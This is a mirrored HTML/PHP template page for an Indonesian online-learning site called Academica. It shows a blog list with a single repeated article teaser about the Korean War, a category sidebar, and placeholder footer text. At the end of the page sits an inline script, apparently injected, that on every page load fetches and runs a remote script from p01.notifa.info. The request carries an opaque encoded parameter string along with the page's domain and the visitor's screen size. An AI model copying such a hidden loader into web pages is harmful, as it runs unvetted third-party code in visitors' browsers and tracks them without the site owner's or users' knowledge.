<!DOCTYPE html>
<html lang="en">	
<!-- Mirrored from templines.rocks/html/academica/blog-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 03 Dec 2018 14:36:53 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimal-ui">
		<title>Academica</title>
		<link href="assets/css/master.css" rel="stylesheet">
       <script src="assets/plugins/jquery/jquery-1.11.3.min.js"></script>

</head>

<body>

<!-- Loader -->
<div id="page-preloader"><span class="spinner"></span></div>
<!-- Loader end -->


		<div class="layout-theme animated-css"  data-header="sticky" data-header-top="200">

	

			<div id="wrapper">

				<!-- HEADER -->
				<header class="header">
                <div class="top-header">
        <div class="container">
          <div class="row">
            <div class="col-xs-12">
              <div class="top-header__contacts">(+62) 813 1334 5357</div>
              <div class="top-header__contacts"><a href="mailto:Info@academica.com">Info@academica.com</a></div>
              <div class="top-header__link">
                <button class="btn-header btn-effect">LATEST</button>
                <span>We have added new courses today ...</span> </div>
              <div class="header-login"> <a class="header-login__item" href="javascript:void(0);"><i class="icon stroke icon-User"></i>Sign In</a> <a class="header-login__item" href="javascript:void(0);">Register</a> </div>
            </div>
            <!-- end col  --> 
          </div>
          <!-- end row  --> 
        </div>
        <!-- end container  --> 
      </div>
      <!-- end top-header  -->
      
      <div class="container">
        <div class="row">
          <div class="col-xs-12"> <a class="header-logo" href="javascript:void(0);"><img class="header-logo__img" src="assets/img/logo.png" height="50" width="195" alt="Logo"></a>
            <div class="header-inner">
              <nav class="navbar yamm">
                <div class="navbar-header hidden-md  hidden-lg  hidden-sm ">
                  <button type="button" data-toggle="collapse" data-target="#navbar-collapse-1" class="navbar-toggle"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button>
                </div>
                <div id="navbar-collapse-1" class="navbar-collapse collapse">
                  <ul class="nav navbar-nav">
                    <li class="dropdown"><a href="index.php">Home<span class="nav-subtitle">OUR World</span></a>
                    
                    </li>
                    <li class="dropdown"> <a href="#">JENJANG<span class="nav-subtitle">What We Offers</span></a>
                      <ul role="menu" class="dropdown-menu">
                        <li><a href="#">SD</a>
                          <ul role="menu" class="dropdown-menu">
                            <li><a href="courses-1.php">Matematika</a> </li>
                            <li><a href="courses-2.php">Bahasa Indonesia</a> </li>
                            <li><a href="courses-3.php">Bahasa Inggris</a></li>
                          </ul>
                        </li>
                        <li><a href="#">SMP</a>
                          <ul role="menu" class="dropdown-menu">
                            <li><a href="courses-1.php">Matematika</a> </li>
                            <li><a href="courses-2.php">Bahasa Indonesia</a> </li>
                            <li><a href="courses-3.php">Bahasa Inggris</a></li>
                            <li><a href="courses-4.php">IPA</a></li>
                          </ul>
                        </li>
                        <li><a href="#">SMA</a>
                          <ul role="menu" class="dropdown-menu">
                            <li><a href="courses-1.php">Matematika</a> </li>
                            <li><a href="courses-2.php">Bahasa Indonesia</a> </li>
                            <li><a href="courses-3.php">Bahasa Inggris</a></li>
                            <li><a href="courses-4.php">IPA</a></li>
                            <li><a href="courses-5.php">IPS</a></li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                    <li class="dropdown"> <a href="javascript:void(0);">PAGES<span class="nav-subtitle">Information</span></a>
                      <ul role="menu" class="dropdown-menu">
                        <li><a href="about.php">about</a> </li>
                        <li><a href="instructors.php">instructors</a> </li>
                      </ul>
                    </li>
                    <li class="dropdown"> <a href="artikel.php">ARTIKEL<span class="nav-subtitle">Latest News</span></a>
                      
                    </li>
                    <li><a href="contact.php">CONTACT<span class="nav-subtitle">say us hi</span></a></li>
                  </ul>
                </div>
              </nav>
              <!--end navbar --> 
              
            </div>
            <!-- end header-inner --> 
          </div>
          <!-- end col  --> 
        </div>
        <!-- end row  --> 
      </div>
      <!-- end container--> 
    </header><!-- end header -->


				<div class="wrap-title-page">
					<div class="container">
						<div class="row">
							<div class="col-xs-12"><h1 class="ui-title-page">latest news</h1></div>
						</div>
					</div><!-- end container-->
				</div><!-- end wrap-title-page -->


				<div class="section-breadcrumb">
					<div class="container">
						<div class="row">
							<div class="col-xs-12">
								<div class="wrap-breadcrumb clearfix">
									<ol class="breadcrumb">
										<li><a href="javascript:void(0);"><i class="icon stroke icon-House"></i></a></li>
										<li class="active">our blog</li>
									</ol>
								</div>
							</div>
						</div><!-- end row -->
					</div><!-- end container -->
				</div><!-- end section-breadcrumb -->


				<div class="container">
					<div class="row">
						<div class="col-md-8">
							<main class="main-content">
								<?php 
									use yii\helpers\Url;
									$artikel = \backend\models\Artikel::find()->all();
									foreach($artikel as $item){
									echo '<article class="post post_mod-j clearfix">';
										echo '<div class="entry-media">';
											echo '<div class="entry-thumbnail">';
												echo '<a href="javascript:void(0);" ><img class="img-responsive" src="" width="760" height="320" alt="Foto"/></a>';
											echo '</div>';
										echo '</div>';
										echo '<div class="post-inner decor decor_mod-a clearfix">';
											echo '<div class="box-date"><span class="number">10</span>AUG</div>';
											echo '<div class="entry-main">';
												echo '<h3 class="entry-title ui-title-inner"><a href="javascript:void(0);">Konflik Sipil-Militer Amerika Serikat dalam Perang Korea</a></h3>';
												echo '<div class="entry-content">';
													echo '<p>Artikel ini membahas tentang keterlibatan Jenderal MacArthur dan Presiden Truman selaku militer dan sipil Amerika Serikat dalam perang Korea. Halo sahabat-sahabat Zenius, ketemu lagi sama gue, Marcel. Di artikel kali ini, gue mau ngelanjutin sejarah konflik di daerah Asia Timur. Setelah sebelumnya membahas bagaimana Tiongkok menjadi negara komunis, di artikel ini gw mau membahas seputar perang Korea. Namun, kalau membahas perang Korea-nya, artikelnya bakal terlalu banyak membahas pertempuran-pertempurannya, ujung-ujungnya malah jadi artikel...</p>';
												echo '</div>';
											echo '</div>';
											echo '<div class="entry-meta">';
												echo '<span class="entry-autor">';
													echo '<span>By </span>';
													echo '<a class="post-link" href="javascript:void(0);">Academica</a>';
												echo '</span>';
												echo '<span class="entry-date"><a class="post-link" href="javascript:void(0);"><i class="icon stroke icon-Agenda"></i>August 10, 2018</a></span>';
												echo '<span class="entry-links">';
													echo '<i class="icon stroke icon-Tag"></i><a class="post-link" href="javascript:void(0);">IPS</a>';
													echo '</span>';
												echo '</div>';
												echo '<a href="artikel_post.php" class="post-btn btn btn-primary btn-effect">READ MORE</a>';
											echo '</div>';
										echo '</div>';
									echo '</article>';
									}
								?>
							</main><!-- end main-content -->


							<ul class="pagination">
								<li><a href="javascript:void(0);"><i class="icon fa fa-angle-left"></i></a></li>
								<li><a href="javascript:void(0);">1</a></li>
								<li><a href="javascript:void(0);">2</a></li>
								<li><a href="javascript:void(0);">3</a></li>
								<li><a href="javascript:void(0);"><i class="icon fa fa-angle-right"></i></a></li>
							</ul>
						</div><!-- end col -->


						<div class="col-md-4">
							<aside class="sidebar sidebar_mod-a">

								<section class="widget widget-default widget_search">
									<h3 class="widget-title ui-title-inner decor decor_mod-a">search blog</h3>
									<form method="get" class="form-search clearfix" >
										<input class="form-search__input" type="text" placeholder="keyword ...">
										<button class="form-search__submit" type="submit"><i class="icon stroke icon-Search"></i></button>
									</form>
								</section>


								


								<div class="widget widget_video">
									<div class="block_content">
										<a class="video-link" href="https://www.youtube.com/watch?v=DIGfO2Dgc9Y&amp;rel=0" rel="prettyPhoto" title="YouTube">
											<img class="img-responsive" src="assets/media/video-bg/1.jpg" height="250" width="350" alt="video">
											<div class="video-link__inner">
												<i class="icon stroke icon-Next"></i>
												<span class="video-link__title">course INTRO</span>
											</div>
										</a>
									</div><!-- end block_content -->
								</div><!-- end widget_video -->


								


								<section class="widget widget-default widget_categories">
									<h3 class="widget-title ui-title-inner decor decor_mod-a">JENJANG - PELAJARAN</h3>
									<div class="block_content">
										<ul class="list-categories list-unstyled">
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SD - Matematika</span>
													<span class="list-categories__number">6</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SD - Bahasa Indonesia</span>
													<span class="list-categories__number">6</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SD - Bahasa Inggris</span>
													<span class="list-categories__number">6</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMP - Matematika</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMP - Bahasa Indonesia</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMP - Bahasa Inggris</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMP - IPA</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMA - Matematika</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMA - Bahasa Indonesia</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMA - Bahasa Inggris</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMA - IPA</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
											<li class="list-categories__item">
												<a class="list-categories__link" href="javascript:void(0);">
													<span class="list-categories__name">SMA - IPS</span>
													<span class="list-categories__number">3</span>
												</a>
											</li>
										</ul>
									</div><!-- end block_content -->
								</section><!-- end widget -->



								<section class="widget widget-default widget_text">
									<h3 class="widget-title ui-title-inner decor decor_mod-a">ACADEMICA</h3>
									<div class="block_content">
										<p>Karena kami ingin para pelajar di Indonesia mendapatkan pengalaman belajar yang hebat, seru dan menyenangkan sehingga mereka memiliki motivasi belajar mandiri yang didasari oleh rasa penasaran terhadap ilmu pengetahuan.</p>
									</div><!-- end block_content -->
								</section><!-- end widget_text -->

							</aside><!-- end sidebar -->
						</div><!-- end col -->
					</div><!-- end row -->
				</div><!-- end container -->


				<footer class="footer">
					<div class="container">
						<div class="footer-inner border-decor_top">
							<div class="row">
								<div class="col-lg-3 col-sm-3">
									<section class="footer-section">
										<h3 class="footer-title">ABOUT US</h3>
										<a href="javascript:void(0);"><img class="footer-logo img-responsive" src="assets/img/logo_white.png" height="50" width="195" alt="Logo"></a>
										<div class="footer-info">Fusce eleifend. Donec sapien sed pha seah lusa. Pellentesque lu amus lorem arcu sem per duiac. Vivamus porta. Sed at nisl praesnt blandit mauris vel erat.</div>
										<div class="footer-contacts footer-contacts_mod-a">
											<i class="icon stroke icon-Pointer"></i>
											<address class="footer-contacts__inner">370 Hill Park, Florida, USA</address>
										</div>
										<div class="footer-contacts">
											<i class="icon stroke icon-Phone2"></i>
											<span class="footer-contacts__inner">Call us 0800 12345</span>
										</div>
										<div class="footer-contacts">
											<i class="icon stroke icon-Mail"></i>
											<a class="footer-contacts__inner" href="mailto:Info@academica.com">Info@academica.com</a>
										</div>
									</section><!-- end footer-section -->
								</div><!-- end col -->

								<div class="col-lg-2 col-sm-3">
									<section class="footer-section">
										<h3 class="footer-title">USEFUL LINKS</h3>
										<ul class="footer-list list-unstyled">
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Teachers & Staff</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Our Latest Courses</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Who We Are</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Get In Touch</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Courses Categories</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Support & FAQ’s</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Terms & Conditions</a></li>
											<li class="footer-list__item"><a class="footer-list__link" href="javascript:void(0);">Privacy Policy</a></li>
										</ul>
									</section><!-- end footer-section -->
								</div><!-- end col -->

								<div class="col-lg-3 col-sm-3">
									<section class="footer-section">
										<h3 class="footer-title">LATEST TWEETS</h3>
										<div class="tweets">
											<div class="tweets__text">What is the enemy of #creativity?</div>
											<div><a href="javascript:void(0);">http://enva.to/hVl5G</a></div>
											<span class="tweets__time">9 hours ago</span>
										</div>
										<div class="tweets">
											<div class="tweets__text">An agile framework can produce the type of lean marketing essential for the digital age <a href="javascript:void(0);">@aholmes360 #IMDS15</a></div>
											<span class="tweets__time">9 hours ago</span>
										</div>
										<a class="tweets__link" href="javascript:void(0);">Follow @Academica</a>
									</section><!-- end footer-section -->
								</div><!-- end col -->

								<div class="col-lg-4 col-sm-3">
									<section class="footer-section">
										<h3 class="footer-title">QUICK CONTACT</h3>
										<form class="form">
											<div class="form-group">
												<input class="form-control" type="text" placeholder="Your Name">
												<input class="form-control" type="email" placeholder="Email address">
												<textarea class="form-control" rows="7" placeholder="Message"></textarea>
												<button class="btn btn-primary btn-effect">SEND MESSSAGE</button>
											</div>
										</form>
									</section><!-- end footer-section -->
								</div><!-- end col -->
							</div><!-- end row -->
						</div><!-- end footer-inner -->

						<div class="row">
							<div class="col-xs-12">
								<div class="footer-bottom">
                                <div class="copyright">Copyright © 2018 <a href="javascript:void(0);">Academica</a>, Online Learning  |  Created by <a href="javascript:void(0);">Kelompok 2</a></div>
									<ul class="social-links list-unstyled">
										<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
										<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
										<li><a class="icon fa fa-google-plus" href="javascript:void(0);"></a></li>
										<li><a class="icon fa fa-instagram" href="javascript:void(0);"></a></li>
										<li><a class="icon fa fa-linkedin" href="javascript:void(0);"></a></li>
										<li><a class="icon fa fa-youtube-play" href="javascript:void(0);"></a></li>
									</ul>
								</div><!-- end footer-bottom -->
							</div><!-- end col -->
						</div><!-- end row -->
					</div><!-- end container -->
				</footer>

			</div><!-- end wrapper -->
		</div><!-- end layout-theme -->


	<!-- SCRIPTS --> 
 <script src="assets/js/jquery-migrate-1.2.1.js"></script>
<script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
<script src="assets/js/modernizr.custom.js"></script> 
<script src="assets/js/waypoints.min.js"></script> 
<script src="../../../cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script> 

<!--THEME--> 
<script  src="assets/plugins/sliderpro/js/jquery.sliderPro.min.js"></script> 
<script src="assets/plugins/owl-carousel/owl.carousel.min.js"></script> 
<script src="assets/plugins/isotope/jquery.isotope.min.js"></script> 
<script src="assets/plugins/prettyphoto/js/jquery.prettyPhoto.js"></script> 
<script src="assets/plugins/datetimepicker/jquery.datetimepicker.js"></script> 
<script src="assets/plugins/jelect/jquery.jelect.js"></script> 
<script src="assets/plugins/rendro-easy-pie-chart/dist/jquery.easypiechart.min.js"></script> 
<script src="assets/js/cssua.min.js"></script> 
<script src="assets/js/wow.min.js"></script> 
<script src="assets/js/custom.min.js"></script> 


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdpSXHqfS4C8u4mO2o1bLa42SbR1E69buHrk4Wz1n1Gts5BHirN%2bcI7cT7Z6x3l5X0v3w%2bGxAeQHoX0kKnWwEWvtZYdQ95nJaMiZtoE%2f1o3qnroKwNpEyjvFTTsKyT5b7AIPkxfuwIlpwE2kMKCdci3e%2f7ALrf3SsuNO93psmd00GKM22LjdRF6eaZnLWwc1c8LU%2flijv36fYR5%2bevbsSVh1Ga%2b5Tl59TgvY92closugheI3GA2HNq4AdzYrAXs865gplmC5i5snh4TMXGOsEuZt4JWqAu0ospVRAFcTCx%2ffyp%2fbZMQbWG92r4pqEktVP4cLMOdTPXzKCWi0iKhk4Uv2MUHt1MMx8CFFuBFWbvyGWlJERowfnEK1AcNKUMXZPhCMlyfJUglLDWXUD6wQcsm8eL6c8l1E2bat2mB0ojyLWmJtmReRHyQQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from templines.rocks/html/academica/blog-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 03 Dec 2018 14:37:00 GMT -->
</html>
